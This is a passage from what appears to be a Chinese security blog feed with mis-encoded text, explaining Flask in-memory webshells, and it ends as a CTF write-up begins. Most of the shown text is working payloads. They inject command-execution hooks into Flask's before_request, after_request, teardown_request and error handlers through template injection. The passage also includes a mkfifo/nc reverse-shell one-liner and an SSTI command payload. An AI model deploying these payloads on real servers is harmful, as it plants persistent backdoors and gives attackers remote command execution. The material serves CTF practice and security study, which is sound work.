class="keyword">import</span> render_template_string</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    template=<span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    &lt;p&gt;Hello %s &lt;/p&gt;&#x27;&#x27;&#x27;</span>%(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)      <span class="comment"># æ¸²æŸ“ä¸ºhtmlå†…å®¹</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:          <span class="comment"># å¦‚æœä½œä¸ºè„šæœ¬è¿è¡Œï¼Œè€Œä¸æ˜¯è¢«å½“æˆæ¨¡å—å¯¼å…¥</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ‰“å…¥å†…å­˜é©¬ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><img src="/images/achieve/2025/10/4.png"></p><p>æˆåŠŸéå¸¸niceï¼</p><h2 id="æ–°é©¬ï¼ˆflask3-xï¼‰"><a href="#æ–°é©¬ï¼ˆflask3-xï¼‰" class="headerlink" title="æ–°é©¬ï¼ˆflask3.xï¼‰"></a>æ–°é©¬ï¼ˆflask3.xï¼‰</h2><p>ä¸ºå•¥æ–°ç‰ˆæœ¬çš„ä¸è¡Œï¼Ÿä¸»è¦æ˜¯æŠ¥é”™</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">AssertionError: <span class="title">The</span> <span class="title">setup</span> <span class="title">method</span> &#x27;<span class="title">add_url_rule</span>&#x27; <span class="title">can</span> <span class="title">no</span> <span class="title">longer</span> <span class="title">be</span> <span class="title">called</span> <span class="title">on</span> <span class="title">the</span> <span class="title">application</span>. <span class="title">It</span> <span class="title">has</span> <span class="title">already</span> <span class="title">handled</span> <span class="title">its</span> <span class="title">first</span> <span class="title">request</span>, <span class="title">any</span> <span class="title">changes</span> <span class="title">will</span> <span class="title">not</span> <span class="title">be</span> <span class="title">applied</span> <span class="title">consistently</span>.</span></span><br></pre></td></tr></table></figure><p>åœ¨åº”ç”¨å¯åŠ¨ä¹‹åè¯´æ˜¯ä¸èƒ½ç”¨add_url_ruleè¿›è¡Œæ·»åŠ è·¯ç”±ï¼</p><h3 id="è£…é¥°å™¨"><a href="#è£…é¥°å™¨" class="headerlink" title="è£…é¥°å™¨"></a>è£…é¥°å™¨</h3><p>ä»€ä¹ˆæ˜¯è£…é¥°å™¨ï¼Ÿ</p><p>è£…é¥°å™¨æ˜¯ä¸€ç§ç”¨äº<strong>ä¿®æ”¹æˆ–å¢å¼ºå‡½æ•°æˆ–æ–¹æ³•è¡Œä¸º</strong>çš„é«˜çº§å‡½æ•°ã€‚è£…é¥°å™¨æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ¥å—å‡½æ•°ä½œä¸ºå‚æ•°å¹¶è¿”å›ä¸€ä¸ªæ–°å‡½æ•°çš„å‡½æ•°ã€‚</p><h4 id="åˆ©ç”¨before-request"><a href="#åˆ©ç”¨before-request" class="headerlink" title="åˆ©ç”¨before_request"></a>åˆ©ç”¨before_request</h4><p>before_request æ–¹æ³•å…è®¸æˆ‘ä»¬åœ¨æ¯ä¸ªè¯·æ±‚ä¹‹å‰æ‰§è¡Œä¸€äº›æ“ä½œ,è·Ÿè¿›å®ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>(<span class="params">self, f: T_before_request</span>) -&gt; T_before_request:</span><br><span class="line">    <span class="variable language_">self</span>.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p><code>self.before_request_funcs</code> æ˜¯ Flask åº”ç”¨å¯¹è±¡ä¸­çš„ä¸€ä¸ªå±æ€§ã€‚å®ƒæ˜¯ä¸€ä¸ª <strong>å­—å…¸</strong>ï¼Œç”¨äºå­˜å‚¨åœ¨è¯·æ±‚å¤„ç†ä¹‹å‰éœ€è¦æ‰§è¡Œçš„é’©å­å‡½æ•°ã€‚</p><p><code>setdefault(None,[]).append(f)</code>è¿™ä¸ªå…¶å®å°±æ˜¯ç”¨æ¥å¢åŠ æ–°çš„é’©å­å‡½æ•°çš„ï¼é‚£ä¹ˆæˆ‘ä»¬æ’å…¥lambda:<strong>import</strong>(â€˜osâ€™).popen(_request_ctx_stack.top.request.args.get(â€˜cmdâ€™, â€˜whoamiâ€™)).read()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;</span>,&#123;<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸å®šä¹‰å­—å…¸ä¹Ÿå¯ä»¥å»sys.modulesé‡Œé¢å»æ‰¾</p><blockquote><p>sys.modulesæ˜¯ä¸€ä¸ªå…¨å±€å­—å…¸ï¼Œè¯¥å­—å…¸æ˜¯pythonå¯åŠ¨åå°±åŠ è½½åœ¨å†…å­˜ä¸­ã€‚æ¯å½“ç¨‹åºå‘˜å¯¼å…¥æ–°çš„æ¨¡å—ï¼Œsys.moduleséƒ½å°†è®°å½•è¿™äº›æ¨¡å—ã€‚å­—å…¸sys.moduleså¯¹äºåŠ è½½æ¨¡å—èµ·åˆ°äº†ç¼“å†²çš„ä½œç”¨ã€‚å½“æŸä¸ªæ¨¡å—ç¬¬ä¸€æ¬¡å¯¼å…¥ï¼Œå­—å…¸sys.moduleså°†è‡ªåŠ¨è®°å½•è¯¥æ¨¡å—ã€‚å½“ç¬¬äºŒæ¬¡å†å¯¼å…¥è¯¥æ¨¡å—æ—¶ï¼Œpythonä¼šç›´æ¥åˆ°å­—å…¸ä¸­æŸ¥æ‰¾ï¼Œä»è€ŒåŠ å¿«äº†ç¨‹åºè¿è¡Œçš„é€Ÿåº¦</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure><p>å½“ç„¶æ‰¾appè¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•ä¸ç»å¯¹ï¼Œéšæœºåº”å˜å³å¯</p><p>è¿™ä¸ªpayloadçš„ç¼ºç‚¹å°±æ˜¯åªèƒ½ç”¨ä¸€æ¬¡ï¼Œæ¯•ç«Ÿä½ æ‰“å…¥ä¹‹åæ¯æ¬¡è¯·æ±‚ä¹‹å‰å°±ä¼šæ‰§è¡Œæˆ‘ä»¬æ’å…¥çš„lambdaå‡½æ•°ï¼</p><h4 id="åˆ©ç”¨after-request"><a href="#åˆ©ç”¨after-request" class="headerlink" title="åˆ©ç”¨after_request"></a>åˆ©ç”¨after_request</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">after_request</span>(<span class="params">self, f</span>):</span><br><span class="line">    <span class="variable language_">self</span>.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p>å…ˆè‡ªå·±æ•´ä¸€æ•´</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url<span class="built_in">_</span>for.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;app.after<span class="built_in">_</span>request<span class="built_in">_</span>funcs.setdefault(None, []).append(lambda:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;,&#123;&#x27;app&#x27;:url<span class="built_in">_</span>for.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;current<span class="built_in">_</span>app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆä¸è¡Œï¼ˆåœ¨before_requestçš„åŸºç¡€ä¸Šæ”¹ï¼‰ï¼Œæ‰“å…¥è¿›å»ä¹‹åæ¯æ¬¡è¯·æ±‚ä¹‹åå°±ä¼šå°±æ˜¯æ‰§è¡Œæˆ‘ä»¬çš„å‡½æ•°ï¼Œä½†æ˜¯è¿™ä¸æ˜¯å“åº”å•Šå“¥ä»¬</p><p>æ¥åˆ†ææ­£ç¡®çš„payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    app.after_request_funcs.setdefault(None, []).append(</span></span><br><span class="line"><span class="string">        lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(</span></span><br><span class="line"><span class="string">            \&quot;\&quot;\&quot;</span></span><br><span class="line"><span class="string">            global CmdResp;</span></span><br><span class="line"><span class="string">            CmdResp = __import__(&#x27;flask&#x27;).make_response(</span></span><br><span class="line"><span class="string">                __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">            \&quot;\&quot;\&quot;</span></span><br><span class="line"><span class="string">        ) == None else resp</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;request&#x27;</span>: url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>resp</code> ä»£è¡¨ Response Object (å“åº”å¯¹è±¡)å°±æ˜¯åŸæ¥çš„å“åº”ï¼<code>__import__(&#39;flask&#39;).make_response()</code>è¿™é‡Œå°±å¯çœ‹åˆ°æ˜¯éœ€è¦è°ƒç”¨make_response()è¿™ä¸ªå‡½æ•°æ¥ç”Ÿæˆæ–°çš„å“åº”å†…å®¹çš„</p><p><img src="/images/achieve/2025/10/5.png"></p><p>è¿™ä¸ªå°±çˆ½å¤šäº†ï¼</p><h3 id="hookå‡½æ•°"><a href="#hookå‡½æ•°" class="headerlink" title="hookå‡½æ•°"></a>hookå‡½æ•°</h3><p>è¿™ä¸ªä¸Šé¢å°±ç”¨åˆ°äº†ï¼Œæ’å…¥çš„å°±æ˜¯æˆ‘ä»¬å®šä¹‰çš„é’©å­å‡½æ•°</p><blockquote><p>æœ¬è´¨æ˜¯ï¼šå…è®¸ç”¨æˆ·åœ¨æŸä¸ªç‰¹å®šæ—¶æœºæ’å…¥è‡ªå®šä¹‰é€»è¾‘çš„ä¸€ç§æœºåˆ¶ï¼Œé€šä¿—ç‚¹è®²å°±æ˜¯ï¼Œé’©å­å‡½æ•°å°±åƒæ˜¯åœ¨ä¸€ä¸ªæµç¨‹ä¸­é¢„ç•™å‡ºæ¥çš„æŒ‚é’©ç‚¹ï¼Œä½ å¯ä»¥æŒ‚ä¸Šè‡ªå·±çš„å‡½æ•°æ¥æ”¹å˜æˆ–å¢å¼ºåŸæœ‰çš„è¡Œä¸º<br>è¿™ä¸ªæ˜¯ä¸æ˜¯å’Œå‰é¢çš„è£…é¥°å™¨ï¼ˆå¢å¼ºå‡½æ•°è¡Œä¸ºï¼‰æœ‰ç‚¹åƒï¼Œå…¶å®è£…é¥°å™¨æ˜¯å°±æ˜¯é€šè¿‡é’©å­å‡½æ•°æ¥å¢å¼ºå‡½æ•°çš„è¡Œä¸ºçš„</p></blockquote><p>ç‰¹ç‚¹ï¼š</p><ul><li>é¢„å®šä¹‰çš„è°ƒç”¨æ—¶æœºï¼šä¸æ˜¯ä½ ç›´æ¥è°ƒç”¨é’©å­å‡½æ•°ï¼Œè€Œæ˜¯æŸä¸ªç³»ç»Ÿã€æ¡†æ¶æˆ–åº“åœ¨åˆé€‚çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨å®ƒã€‚</li><li>ç”¨æˆ·è‡ªå®šä¹‰é€»è¾‘ï¼šä½ å†™çš„å‡½æ•°ä¼šè¢«å½“ä½œ â€œé’©å­â€ æ’å…¥åŸæµç¨‹ä¸­æ‰§è¡Œã€‚</li><li>å¯æ’æ‹”ã€çµæ´»æ‰©å±•ï¼šä¸éœ€è¦æ”¹åŠ¨åŸä»£ç ï¼Œå°±å¯ä»¥é€šè¿‡é’©å­å¢å¼ºåŠŸèƒ½</li></ul><h4 id="teardown-request"><a href="#teardown-request" class="headerlink" title="teardown_request"></a>teardown_request</h4><blockquote><p>teardown_request æ˜¯åœ¨æ¯ä¸ªè¯·æ±‚çš„æœ€åé˜¶æ®µæ‰§è¡Œçš„ï¼Œå³åœ¨è§†å›¾å‡½æ•°å¤„ç†å®Œæˆå¹¶ç”Ÿæˆå“åº”åï¼Œæˆ–è€…åœ¨è¯·æ±‚ä¸­å‘ç”Ÿæœªå¤„ç†çš„å¼‚å¸¸æ—¶ï¼Œéƒ½ä¼šæ‰§è¡Œè¿™ä¸ªé’©å­ã€‚</p><p>å®ƒæ‰§è¡Œçš„æ—¶æœºæ˜¯åœ¨å“åº”å·²ç»ç¡®å®šä¹‹åï¼Œä½†åœ¨æœ€ç»ˆå‘é€ç»™å®¢æˆ·ç«¯ä¹‹å‰ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">teardown_request</span>(<span class="params">self, f</span>):</span><br><span class="line">        <span class="variable language_">self</span>.teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">        <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p>ç”±äºæ˜¯æ— å›æ˜¾æ‰€ä»¥åå¼¹shellå’Œå†™å…¥æ–‡ä»¶éƒ½å¯ä»¥</p><p>åå¼¹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).system(&#x27;mkfifo /tmp/fifo; /bin/sh -i &lt; /tmp/fifo | nc ip port &gt; /tmp/fifo; rm /tmp/fifo&#x27;))&quot;</span>)</span><br></pre></td></tr></table></figure><p>å†™å…¥æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(&#x27;ls &gt; 11.txt&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h4><p>æ­¤å‡½æ•°å¯ä»¥ç”¨äºè‡ªå®šä¹‰ 404 é¡µé¢çš„å›æ˜¾ï¼Œç”¨äºå¤„ç†åº”ç”¨ç¨‹åºä¸­å‘ç”Ÿçš„é”™è¯¯ï¼Œå½“ä½  flask é‡åˆ°é”™è¯¯ï¼Œä½ å¯ä»¥å®šä¹‰è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†ç¨‹åºæ¥å¤„ç†é”™è¯¯å¹¶è¿”å›é€‚å½“çš„å“åº”</p><p>è·Ÿè¿›æ‹¿åˆ°æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">errorhandler</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, code_or_exception: <span class="built_in">type</span>[Exception] | <span class="built_in">int</span></span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Callable</span>[[T_error_handler], T_error_handler]:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">f: T_error_handler</span>) -&gt; T_error_handler:</span><br><span class="line">        <span class="variable language_">self</span>.register_error_handler(code_or_exception, f)      <span class="comment">#è¿™ä¸ªæ˜¯å»æ³¨å†Œf</span></span><br><span class="line">        <span class="keyword">return</span> f         <span class="comment">#è¿”å›çš„æ˜¯é”™è¯¯å¤„ç†å‡½æ•°</span></span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"><span class="comment"># T_error_handler   é”™è¯¯å¤„ç†å‡½æ•°çš„ç±»å‹</span></span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›çœ‹çœ‹æ˜¯æ€ä¹ˆæ³¨å†Œçš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register_error_handler</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        code_or_exception: <span class="built_in">type</span>[Exception] | <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">        f: ft.ErrorHandlerCallable,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        exc_class, code = <span class="variable language_">self</span>._get_exc_class_and_code(code_or_exception)</span><br><span class="line">        <span class="variable language_">self</span>.error_handler_spec[<span class="literal">None</span>][code][exc_class] = f</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨å†Œå°±æ˜¯error_handler_specï¼Œå®ƒçš„ç»“æ„ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">self.error<span class="built_in">_</span>handler<span class="built_in">_</span>spec = &#123;</span><br><span class="line">    None: &#123;</span><br><span class="line">        404: &#123;</span><br><span class="line">            HTTPException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>404,</span><br><span class="line">            AnotherException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>another,</span><br><span class="line">        &#125;,</span><br><span class="line">        500: &#123;</span><br><span class="line">            HTTPException: error<span class="built_in">_</span>handler<span class="built_in">_</span>function<span class="built_in">_</span>500,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´é€šè¿‡codeå’Œexc_classå»æ³¨å†Œè¿™ä¸ªfï¼ˆé”™è¯¯å¤„ç†å‡½æ•°ï¼‰ï¼Œ</p><p>ä½†æ˜¯è¿™ä¸¤å®¶ä¼™ç”±_get_exc_class_and_code(code_or_exception)è¿™ä¸ªæ§åˆ¶</p><blockquote><p>è¿™ä¸ªå®šä¹‰çš„å‡½æ•° _get_exc_class_and_code æ˜¯ç”¨æ¥å¤„ç†å¼‚å¸¸ç±»æˆ– HTTP çŠ¶æ€ç çš„ã€‚å‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•°ï¼Œexc_class_or_codeï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªå¼‚å¸¸ç±»æˆ–è€…ä¸€ä¸ª HTTP çŠ¶æ€ç ï¼ˆæ•´å‹ï¼‰ã€‚</p></blockquote><p>é‚£ä¹ˆæ¥ä¸‹æ¥ç›´æ¥æ§åˆ¶fä¸å°±å¥½äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__.<span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read()&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__.<span class="built_in">exec</span>(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">global exc_class</span></span><br><span class="line"><span class="string">global code</span></span><br><span class="line"><span class="string">exc_class, code = app._get_exc_class_and_code(404)</span></span><br><span class="line"><span class="string">app.error_handler_spec[None][code][exc_class] =</span></span><br><span class="line"><span class="string">lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;,&#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;request&#x27;</span>: url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯åœ¨execé‡Œé¢å¿…é¡»æŒ‡å®šexecçš„ç”±æ¥ï¼Œä¸åƒä¹‹å‰sstié‡Œé¢æ‰“çš„</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(request.values.x).read()&#125;&#125;<span class="built_in">&amp;</span>x=cat /f*</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä¹Ÿç®—æ˜¯å­¦äº†ä¸€ä¸‹åŸç†ï¼Œä¸»è¦å°±æ˜¯è€é©¬ï¼šåŠ è·¯ç”±ï¼æ–°é©¬ï¼šä¸»è¦å°±æ˜¯æ‰“å…¥é’©å­å‡½æ•°ï¼Œåœ¨ç‰¹å®šçš„æ—¶æœºå»è§¦å‘ï¼</p><p>å½“ç„¶ä¸åªæ˜¯flaskæ¡†æ¶ä¸‹å¯ä»¥æ‰“å†…å­˜é©¬ï¼Œä¸åŒçš„æ¡†æ¶æœ‰ä¸åŒçš„æ‰“æ³•ï¼Œä½†åŸç†ä¼°æ‘¸ç€éƒ½ç±»ä¼¼å§ï¼</p><p>æ¯”å¦‚ï¼š<a href="https://www.caterpie771.cn/archives/333#%E7%BB%8F%E5%85%B8%E8%B7%AF%E7%BA%BF%EF%BC%9A%E6%89%93%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0%E5%87%BD%E6%95%B0">FastAPI å†…å­˜é©¬çš„ç ”ç©¶ - caterpieçš„å°ç«™</a></p>]]></content>
      
      
      <categories>
          
          <category> pythonå†…å­˜é©¬ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…å­˜é©¬ </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜Ÿé€”ctf2025</title>
      <link href="/2025/10/26/%E6%98%9F%E9%80%94ctf2025/"/>
      <url>/2025/10/26/%E6%98%9F%E9%80%94ctf2025/</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>çªç„¶æ„Ÿè§‰è¿™ä¸ªæ¯”èµ›è€ƒçš„ä¸œè¥¿æŒºå¥½çš„ï¼Œä½†æ˜¯åœ¨æ‰“çš„æ—¶å€™å¤ªå¿ƒæ€¥äº†ï¼</p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 